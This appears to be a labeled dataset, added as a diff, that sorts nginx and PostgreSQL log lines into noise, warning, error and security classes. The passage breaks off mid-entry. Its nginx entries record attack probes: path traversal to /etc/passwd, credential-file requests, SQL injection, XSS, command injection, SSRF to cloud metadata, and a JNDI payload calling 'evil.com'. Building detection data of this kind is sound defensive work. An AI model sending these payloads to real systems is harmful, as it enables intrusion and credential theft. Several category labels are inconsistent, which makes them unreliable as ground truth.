@@ -1,0 +1,2757 @@
+[
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Sourcing /docker-entrypoint.d/15-local-resolvers.envsh",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "/docker-entrypoint.sh: Configuration complete; ready for start up",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /proxy_fail HTTP/1.1\" 502 157 \"-\" \"Python-urllib/3.14\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /empty_dir/ HTTP/1.1\" 403 153 \"-\" \"Python-urllib/3.14\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"POST / HTTP/1.1\" 413 183 \"-\" \"Python-urllib/3.14\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"POST /index.html HTTP/1.1\" 405 157 \"-\" \"Python-urllib/3.14\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"INVALID_VERB / HTTP/1.1\" 405 157 \"-\" \"-\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"POST / HTTP/1.1\" 413 183 \"-\" \"-\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 157 \"-\" \"-\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /../../../../etc/shadow HTTP/1.1\" 400 157 \"-\" \"-\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.env HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.git/config HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.git/HEAD HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /wp-config.php HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /phpmyadmin/index.php HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v1/users?id=1%20OR%201=1 HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /search?q=<script>alert('xss')</script> HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /cgi-bin/test.cgi?cmd=id HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /proc/self/environ HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /admin/backup.sql HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.aws/credentials HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v1/auth?user=admin'-- HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /console/login.action HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /search?q=${jndi:ldap://evil.com/a} HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /.ssh/id_rsa HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /shell?cmd=cat%20/etc/passwd HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /actuator/env HTTP/1.1\" 404 153 \"-\" \"Scanner/2.1\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /missing-route-a HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /missing-route-b HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /assets/missing-style.css HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v2/deprecated HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /favicon.ico HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /docs/old-guide HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /v1/api/removed-endpoint HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /legacy/dashboard.html HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /static/bundle-old.js HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /images/logo-missing.png HTTP/1.1\" 404 153 \"-\" \"Mozilla/5.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET / HTTP/1.1\" 200 896 \"-\" \"HealthCheck/1.0\"",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /index.html HTTP/1.1\" 200 896 \"-\" \"HealthCheck/1.0\"",
+    "category": "noise"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /robots.txt HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /health HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /status HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /api/v1/ping HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /metrics HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "172.17.0.1 - - [15/Sep/2026:07:32:10 +0000] \"GET /version HTTP/1.1\" 404 153 \"-\" \"HealthCheck/1.0\"",
+    "category": "warning"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 172.17.0.1, server: localhost, request: \"GET /proxy_fail HTTP/1.1\", upstream: \"http://127.0.0.1:19999/proxy_fail\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *3 directory index of \"/usr/share/nginx/html/empty_dir/\" is forbidden, client: 172.17.0.1, server: localhost, request: \"GET /empty_dir/ HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *4 client intended to send too large body: 500 bytes, client: 172.17.0.1, server: localhost, request: \"POST / HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *7 client intended to send too large body: 5000 bytes, client: 172.17.0.1, server: localhost, request: \"POST / HTTP/1.1\", host: \"localhost\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *10 open() \"/usr/share/nginx/html/.env\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.env HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *11 open() \"/usr/share/nginx/html/.git/config\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.git/config HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *12 open() \"/usr/share/nginx/html/.git/HEAD\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.git/HEAD HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *13 open() \"/usr/share/nginx/html/wp-config.php\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /wp-config.php HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *14 open() \"/usr/share/nginx/html/phpmyadmin/index.php\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /phpmyadmin/index.php HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *15 open() \"/usr/share/nginx/html/api/v1/users\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v1/users?id=1%20OR%201=1 HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *16 open() \"/usr/share/nginx/html/search\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /search?q=<script>alert('xss')</script> HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *17 open() \"/usr/share/nginx/html/cgi-bin/test.cgi\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /cgi-bin/test.cgi?cmd=id HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *18 open() \"/usr/share/nginx/html/proc/self/environ\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /proc/self/environ HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *19 open() \"/usr/share/nginx/html/admin/backup.sql\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /admin/backup.sql HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *20 open() \"/usr/share/nginx/html/.aws/credentials\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.aws/credentials HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *21 open() \"/usr/share/nginx/html/api/v1/auth\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v1/auth?user=admin'-- HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *22 open() \"/usr/share/nginx/html/console/login.action\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /console/login.action HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *23 open() \"/usr/share/nginx/html/search\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /search?q=${jndi:ldap://evil.com/a} HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *24 open() \"/usr/share/nginx/html/.ssh/id_rsa\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /.ssh/id_rsa HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *25 open() \"/usr/share/nginx/html/shell\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /shell?cmd=cat%20/etc/passwd HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *26 open() \"/usr/share/nginx/html/proxy\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *27 open() \"/usr/share/nginx/html/actuator/env\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /actuator/env HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "security"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *28 open() \"/usr/share/nginx/html/missing-route-a\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /missing-route-a HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *29 open() \"/usr/share/nginx/html/missing-route-b\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /missing-route-b HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *30 open() \"/usr/share/nginx/html/assets/missing-style.css\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /assets/missing-style.css HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *31 open() \"/usr/share/nginx/html/api/v2/deprecated\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v2/deprecated HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *32 open() \"/usr/share/nginx/html/favicon.ico\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /favicon.ico HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *33 open() \"/usr/share/nginx/html/docs/old-guide\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /docs/old-guide HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *34 open() \"/usr/share/nginx/html/v1/api/removed-endpoint\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /v1/api/removed-endpoint HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *35 open() \"/usr/share/nginx/html/legacy/dashboard.html\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /legacy/dashboard.html HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *36 open() \"/usr/share/nginx/html/static/bundle-old.js\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /static/bundle-old.js HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *37 open() \"/usr/share/nginx/html/images/logo-missing.png\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /images/logo-missing.png HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *40 open() \"/usr/share/nginx/html/robots.txt\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /robots.txt HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *41 open() \"/usr/share/nginx/html/health\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /health HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *42 open() \"/usr/share/nginx/html/status\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /status HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *43 open() \"/usr/share/nginx/html/api/v1/ping\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /api/v1/ping HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *44 open() \"/usr/share/nginx/html/metrics\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /metrics HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "nginx",
+    "raw_log": "2026/09/15 07:32:10 [error] 30#30: *45 open() \"/usr/share/nginx/html/version\" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: \"GET /version HTTP/1.1\", host: \"127.0.0.1:8089\"",
+    "category": "error"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "The files belonging to this database system will be owned by user \"postgres\".",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "This user must also own the server process.",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "The database cluster will be initialized with locale \"en_US.utf8\".",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "The default database encoding has accordingly been set to \"UTF8\".",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "The default text search configuration will be set to \"english\".",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "Data page checksums are disabled.",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "fixing permissions on existing directory /var/lib/postgresql/data ... ok",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "creating subdirectories ... ok",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "selecting dynamic shared memory implementation ... posix",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "selecting default max_connections ... 100",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "selecting default shared_buffers ... 128MB",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "selecting default time zone ... UTC",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "creating configuration files ... ok",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "running bootstrap script ... ok",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "performing post-bootstrap initialization ... ok",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "syncing data to disk ... ok",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "Success. You can now start the database server using:",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "pg_ctl -D /var/lib/postgresql/data -l logfile start",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "waiting for server to start....2026-09-15 07:32:15.764 UTC [41] LOG:  starting PostgreSQL 15.18 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.771 UTC [41] LOG:  listening on Unix socket \"/var/run/postgresql/.s.PGSQL.5432\"",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.792 UTC [44] LOG:  database system was shut down at 2026-09-15 07:32:15 UTC",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "done",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "server started",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.833 UTC [50] LOG:  connection received: host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.834 UTC [50] LOG:  connection authorized: user=postgres database=postgres application_name=psql",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.850 UTC [50] LOG:  statement: SELECT 1 FROM pg_database WHERE datname = 'postgres' ;",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.852 UTC [50] LOG:  disconnection: session time: 0:00:00.019 user=postgres database=postgres host=[local]",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "/usr/local/bin/docker-entrypoint.sh: ignoring /docker-entrypoint-initdb.d/*",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "waiting for server to shut down...2026-09-15 07:32:15.855 UTC [41] LOG:  received fast shutdown request",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": ".2026-09-15 07:32:15.861 UTC [41] LOG:  aborting any active transactions",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.864 UTC [41] LOG:  background worker \"logical replication launcher\" (PID 47) exited with exit code 1",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.865 UTC [42] LOG:  shutting down",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.871 UTC [42] LOG:  checkpoint starting: shutdown immediate",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.909 UTC [42] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.012 s, sync=0.006 s, total=0.045 s; sync files=2, longest=0.003 s, average=0.003 s; distance=0 kB, estimate=0 kB",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:15.916 UTC [41] LOG:  database system is shut down",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "server stopped",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "PostgreSQL init process complete; ready for start up.",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "sh: locale: not found",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:14.551 UTC [35] WARNING:  no usable system locales were found",
+    "category": "warning"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "initdb: warning: enabling \"trust\" authentication for local connections",
+    "category": "warning"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "initdb: hint: You can change this by editing pg_hba.conf or using the option -A, or --auth-local and --auth-host, the next time you run initdb.",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:16.001 UTC [1] LOG:  starting PostgreSQL 15.18 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:16.002 UTC [1] LOG:  listening on IPv4 address \"0.0.0.0\", port 5432",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
+    "raw_log": "2026-09-15 07:32:16.002 UTC [1] LOG:  listening on IPv6 address \"::\", port 5432",
+    "category": "noise"
+  },
+  {
+    "system": "postgresql",
